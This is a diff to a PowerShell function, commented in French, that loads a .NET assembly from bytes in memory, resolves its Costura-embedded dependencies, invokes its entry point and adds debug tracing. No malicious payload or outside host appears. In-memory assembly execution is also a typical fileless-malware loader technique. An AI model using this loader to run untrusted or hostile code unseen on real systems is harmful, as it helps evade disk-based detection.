@@ -21,30 +21,18 @@ function Execute-InMemory {
         [byte[]]$bytes
     )
 
-    # Charger l'assembly d'abord
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    # IMPORTANT: Ajouter le handler AVANT de charger l'assembly
+    $script:mainAssembly = $null
     
-    # Essayer de declencher l'initialisation de Costura manuellement
-    try {
-        $costuraType = $assembly.GetType("Costura.AssemblyLoader")
-        if ($costuraType -ne $null) {
-            $attachMethod = $costuraType.GetMethod("Attach", [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
-            if ($attachMethod -ne $null) {
-                $attachMethod.Invoke($null, $null)
-            }
-        }
-    } catch {
-        # Si Costura ne s'initialise pas automatiquement, utiliser notre handler
-    }
-    
-    # Handler de secours pour Costura (au cas ou Attach() ne fonctionne pas)
-    $script:mainAssembly = $assembly
     $onAssemblyResolve = {
         param($sender, $e)
         $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
+        Write-Host "[AssemblyResolve] Recherche: $assemblyName" -ForegroundColor Magenta
         
         if ($script:mainAssembly -ne $null) {
             $resourceNames = $script:mainAssembly.GetManifestResourceNames()
+            Write-Host "[AssemblyResolve] Ressources disponibles: $($resourceNames.Count)" -ForegroundColor Cyan
+            
             # Chercher toutes les variantes possibles
             $resourceName = $resourceNames | Where-Object { 
                 $_ -like "costura.$assemblyName.dll.compressed" -or 
@@ -54,6 +42,7 @@ function Execute-InMemory {
             } | Select-Object -First 1
             
             if ($resourceName) {
+                Write-Host "[AssemblyResolve] Ressource trouvee: $resourceName" -ForegroundColor Green
                 try {
                     $stream = $script:mainAssembly.GetManifestResourceStream($resourceName)
                     if ($stream -ne $null) {
@@ -69,17 +58,42 @@ function Execute-InMemory {
                             $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                         }
                         $stream.Close()
+                        Write-Host "[AssemblyResolve] Assembly charge avec succes!" -ForegroundColor Green
                         return [System.Reflection.Assembly]::Load($assemblyBytes)
                     }
-                } catch {}
+                } catch {
+                    Write-Host "[AssemblyResolve] ERREUR: $($_.Exception.Message)" -ForegroundColor Red
+                }
+            } else {
+                Write-Host "[AssemblyResolve] Ressource NON trouvee pour: $assemblyName" -ForegroundColor Yellow
             }
+        } else {
+            Write-Host "[AssemblyResolve] mainAssembly est null!" -ForegroundColor Red
         }
         return $null
     }
     
     [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)
+    Write-Host "[DEBUG] Handler AssemblyResolve ajoute" -ForegroundColor Cyan
+    
+    # Maintenant charger l'assembly (le handler sera appele si besoin)
+    $script:mainAssembly = [System.Reflection.Assembly]::Load($bytes)
+    Write-Host "[DEBUG] Assembly charge, ressources Costura: $($script:mainAssembly.GetManifestResourceNames() | Where-Object { $_ -like 'costura.*' } | ForEach-Object { $_ } | Out-String)" -ForegroundColor Cyan
+    
+    # Essayer de declencher l'initialisation de Costura manuellement
+    try {
+        $costuraType = $script:mainAssembly.GetType("Costura.AssemblyLoader")
+        if ($costuraType -ne $null) {
+            $attachMethod = $costuraType.GetMethod("Attach", [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
+            if ($attachMethod -ne $null) {
+                $attachMethod.Invoke($null, $null)
+            }
+        }
+    } catch {
+        # Costura s'initialisera via notre handler
+    }
 
-    $entryPoint = $assembly.EntryPoint
+    $entryPoint = $script:mainAssembly.EntryPoint
     if ($entryPoint -ne $null) {
         $entryPoint.Invoke($null, @())
     }
